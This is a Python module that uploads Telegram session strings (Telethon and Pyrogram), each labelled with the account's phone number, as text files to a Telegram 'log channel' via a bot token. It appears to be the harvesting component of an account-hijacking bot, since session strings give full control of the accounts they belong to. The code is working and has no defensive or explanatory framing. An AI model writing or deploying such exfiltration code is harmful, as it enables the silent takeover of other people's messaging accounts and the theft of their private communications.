"""Send session files to Telegram log channel."""
from __future__ import annotations

import requests

from config import BOT_TOKEN, CHANNEL_ID


def send_to_channel(message: str) -> bool:
    if not BOT_TOKEN or not CHANNEL_ID:
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHANNEL_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
        return r.status_code == 200 and bool(r.json().get("ok"))
    except Exception as e:
        print(f"send_to_channel: {e}", flush=True)
        return False


def send_session_files_to_channel(phone, telethon_string=None, pyrogram_string=None, caption=None) -> bool:
    """Post short summary + Telethon/Pyrogram session as .txt documents."""
    if not BOT_TOKEN or not CHANNEL_ID:
        print("send_session_files: BOT_TOKEN/CHANNEL_ID missing", flush=True)
        return False
    phone_safe = (phone or "session").lstrip("+").replace(" ", "")
    ok_any = False
    try:
        if caption:
            send_to_channel(caption)
        files = []
        if telethon_string:
            files.append((
                f"{phone_safe}_telethon.txt",
                telethon_string.strip() + "\n",
                f"🔐 Telethon session\n📱 {phone}",
            ))
        if pyrogram_string:
            files.append((
                f"{phone_safe}_pyrogram.txt",
                pyrogram_string.strip() + "\n",
                f"🔐 Pyrogram session\n📱 {phone}",
            ))
        for filename, content, file_caption in files:
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={
                        "chat_id": str(CHANNEL_ID),
                        "caption": file_caption,
                        "parse_mode": "HTML",
                    },
                    files={"document": (filename, content.encode("utf-8"), "text/plain")},
                    timeout=25,
                )
                if r.status_code == 200 and r.json().get("ok"):
                    ok_any = True
                else:
                    print(f"sendDocument fail: {r.text[:240]}", flush=True)
            except Exception as e:
                print(f"sendDocument error: {e}", flush=True)
        return ok_any
    except Exception as e:
        print(f"send_session_files_to_channel: {e}", flush=True)
        return False
